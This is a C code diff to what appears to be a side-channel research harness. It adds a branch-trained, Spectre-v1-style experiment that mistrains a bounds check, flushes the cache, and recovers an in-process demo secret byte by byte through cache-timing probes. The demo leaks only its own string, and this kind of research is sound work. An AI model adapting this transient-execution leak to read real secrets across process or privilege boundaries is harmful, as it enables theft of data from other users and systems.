@@ -19,6 +19,8 @@ extern void spec_ret_gadget(void *ptr);
 extern void spec_ret_gadget_burst(void *ptr);
 extern void spec_ret_store_gadget(void *ptr);
 extern void spec_read_gadget(void *secret, void *probe_array);
+extern void spec_branch_read_gadget(size_t idx, size_t *bound_ptr, unsigned char *base,
+                                    void *probe_array);
 extern long time_memory_load(void *ptr);
 extern long time_memory_load_rdpru(void *ptr);
 extern long time_memory_load_rdpru_aperf(void *ptr);
@@ -37,6 +39,9 @@ static const char secret[] = "this is my super secret value!";
 
 #define PAGE_SIZE 4096
 #define CACHE_LINE_SIZE 64
+#define BRANCH_ARRAY_SIZE 16
+#define BRANCH_SECRET_OFFSET 64
+#define DEFAULT_BRANCH_TRAIN_ITERS 30
 #define HIT_THRESHOLD_LLC 350
 #define HIT_THRESHOLD_L1 200
 #define DEFAULT_PRIVATE_CPU 0
@@ -84,6 +89,8 @@ typedef struct {
     int parent_cpu;
     int child_cpu;
     int read_secret;
+    int branch_read_secret;
+    int train_iters;
     int cpu;
 } experiment_config_t;
 
@@ -128,6 +135,11 @@ static void usage(const char *argv0) {
     fprintf(stderr, "  --parent-cpu N         override parent CPU affinity\n");
     fprintf(stderr, "  --child-cpu N          override child CPU affinity\n");
     fprintf(stderr, "  --flush-stack-ptes     flush stack page-table entries before transient access\n");
+    fprintf(stderr, "  --read-secret          run return-based secret read experiment\n");
+    fprintf(stderr, "  --branch-read-secret   run branch-trained secret read experiment\n");
+    fprintf(stderr, "  --train-iters N        branch training iterations per attack "
+                    "(default %d)\n", DEFAULT_BRANCH_TRAIN_ITERS);
+    fprintf(stderr, "  --cpu N                CPU affinity for secret-read modes\n");
     fprintf(stderr, "  --help                 show this message\n");
     fprintf(stderr, "  private defaults to parent_cpu=child_cpu=%d\n", DEFAULT_PRIVATE_CPU);
     fprintf(stderr, "  llc defaults to parent_cpu=%d child_cpu=%d\n",
@@ -377,6 +389,97 @@ static void run_secret_experiment(int num_trials, int cpu) {
     munmap(probe_array, probe_size);
 }
 
+static void run_branch_secret_experiment(int num_trials, int train_iters, int cpu) {
+    size_t probe_size = (size_t)NUM_BYTE_SLOTS * PAGE_SIZE;
+    size_t victim_size = PAGE_SIZE;
+    void *probe_array = mmap(NULL, probe_size, PROT_READ | PROT_WRITE,
+                             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    unsigned char *victim = mmap(NULL, victim_size, PROT_READ | PROT_WRITE,
+                                 MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    int secret_len = (int)strlen(secret);
+    size_t bound = BRANCH_ARRAY_SIZE;
+    size_t malicious_idx = BRANCH_SECRET_OFFSET;
+    unsigned char *array1;
+    unsigned char *secret_ptr;
+
+    if (probe_array == MAP_FAILED || victim == MAP_FAILED) {
+        perror("mmap branch secret buffers");
+        if (probe_array != MAP_FAILED) {
+            munmap(probe_array, probe_size);
+        }
+        if (victim != MAP_FAILED) {
+            munmap(victim, victim_size);
+        }
+        return;
+    }
+
+    memset(probe_array, 0, probe_size);
+    memset(victim, 0, victim_size);
+    array1 = victim;
+    secret_ptr = victim + BRANCH_SECRET_OFFSET;
+    memcpy(secret_ptr, secret, (size_t)secret_len + 1);
+
+    if (pin_to_cpu(cpu) != 0) {
+        perror("sched_setaffinity");
+    }
+    printf("running on cpu %d, branch train iters %d\n", sched_getcpu(), train_iters);
+
+    char guessed[sizeof(secret)] = {0};
+    unsigned int lcg_state = (unsigned int)time(NULL) ^ (unsigned int)getpid();
+    unsigned int branch_train_state = lcg_state ^ 0x9e3779b9u;
+    int *order = malloc(NUM_BYTE_SLOTS * sizeof(int));
+
+    if (order == NULL) {
+        perror("malloc");
+        munmap(probe_array, probe_size);
+        munmap(victim, victim_size);
+        return;
+    }
+
+    for (int i = 0; i < secret_len; i++) {
+        int hits[NUM_BYTE_SLOTS] = {0};
+
+        for (int t = 0; t < num_trials; t++) {
+            branch_train_state = lcg_next(branch_train_state);
+            int current_train_iters =
+                1 + (int)(branch_train_state % (unsigned int)train_iters);
+
+            for (int train = 0; train < current_train_iters; train++) {
+                spec_branch_read_gadget((size_t)(train % BRANCH_ARRAY_SIZE), &bound, array1,
+                                        probe_array);
+            }
+
+            flush_from_cache(probe_array, probe_size);
+            asm volatile("clflush (%0)" : : "r"(&bound) : "memory");
+            spec_branch_read_gadget(malicious_idx + (size_t)i, &bound, array1, probe_array);
+
+            int found = probe(probe_array, NUM_BYTE_SLOTS, HIT_THRESHOLD_L1, order, &lcg_state);
+            if (found >= 0) {
+                hits[found]++;
+            }
+        }
+
+        int best = -1;
+        int best_count = 0;
+        for (int v = 0; v < NUM_BYTE_SLOTS; v++) {
+            if (hits[v] > best_count) {
+                best_count = hits[v];
+                best = v;
+            }
+        }
+
+        guessed[i] = best >= 0 ? (char)best : '_';
+        printf("branch_secret[%2d]: hit_rate=%.1f%%\n", i, 100.0 * best_count / num_trials);
+    }
+
+    printf("expected: %s\n", secret_ptr);
+    printf("received: %s\n", guessed);
+
+    free(order);
+    munmap(probe_array, probe_size);
+    munmap(victim, victim_size);
+}
+
 static void run_experiment(const experiment_config_t *config, void *buf) {
     size_t buf_size = (size_t)config->slots * PAGE_SIZE;
     shared_t *shared = mmap(NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
@@ -524,6 +627,7 @@ static experiment_config_t parse_config(int argc, char **argv) {
     int have_cache = 0;
     int have_parent_cpu = 0;
     int have_child_cpu = 0;
+    int have_cpu = 0;
     int option_index = 0;
     int opt;
     static const struct option long_options[] = {
@@ -537,6 +641,8 @@ static experiment_config_t parse_config(int argc, char **argv) {
         {"child-cpu", required_argument, NULL, 'q'},
         {"flush-stack-ptes", no_argument, NULL, 'f'},
         {"read-secret", no_argument, NULL, 'x'},
+        {"branch-read-secret", no_argument, NULL, 'b'},
+        {"train-iters", required_argument, NULL, 't'},
         {"cpu", required_argument, NULL, 'u'},
         {"help", no_argument, NULL, 'h'},
         {0, 0, 0, 0},
@@ -546,9 +652,11 @@ static experiment_config_t parse_config(int argc, char **argv) {
     config.flush_stack_ptes = 0;
     config.probe_mode = PROBE_FORKED;
     config.gadget_mode = GADGET_LOAD;
+    config.train_iters = DEFAULT_BRANCH_TRAIN_ITERS;
     opterr = 0;
 
-    while ((opt = getopt_long(argc, argv, "s:n:a:g:c:r:p:q:u:fxh", long_options, &option_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "s:n:a:g:c:r:p:q:t:u:fxbh", long_options,
+                              &option_index)) != -1) {
         switch (opt) {
         case 's':
             if (parse_required_int("slots", optarg, &config.slots, 0) != 0) {
@@ -595,9 +703,18 @@ static experiment_config_t parse_config(int argc, char **argv) {
         case 'x':
             config.read_secret = 1;
             break;
+        case 'b':
+            config.branch_read_secret = 1;
+            break;
+        case 't':
+            if (parse_required_int("train_iters", optarg, &config.train_iters, 0) != 0) {
+                exit(1);
+            }
+            break;
         case 'u':
             if (parse_required_int("cpu", optarg, &config.cpu, 1) != 0)
                 exit(1);
+            have_cpu = 1;
             break;
         case 'h':
             usage(argv[0]);
@@ -613,10 +730,17 @@ static experiment_config_t parse_config(int argc, char **argv) {
         usage(argv[0]);
         exit(1);
     }
-    if (config.read_secret) {
+    if (config.read_secret && config.branch_read_secret) {
+        fprintf(stderr, "choose only one secret-read mode\n");
+        exit(1);
+    }
+    if (config.read_secret || config.branch_read_secret) {
         if (!have_trials) {
             usage(argv[0]);
             exit(1);
+        }
+        if (!have_cpu) {
+            config.cpu = DEFAULT_PRIVATE_CPU;
         }
         return config;
     }
@@ -673,12 +797,17 @@ int main(int argc, char **argv) {
     void *buf;
 
     srand((unsigned int)time(NULL));
-    printf("allocating %.2f mb\n", (double)buf_size / (1024.0 * 1024.0));
 
     if (config.read_secret) {
         run_secret_experiment(config.num_trials, config.cpu);
         return 0;
     }
+    if (config.branch_read_secret) {
+        run_branch_secret_experiment(config.num_trials, config.train_iters, config.cpu);
+        return 0;
+    }
+
+    printf("allocating %.2f mb\n", (double)buf_size / (1024.0 * 1024.0));
 
     buf = mmap(NULL, buf_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
     if (buf == MAP_FAILED) {
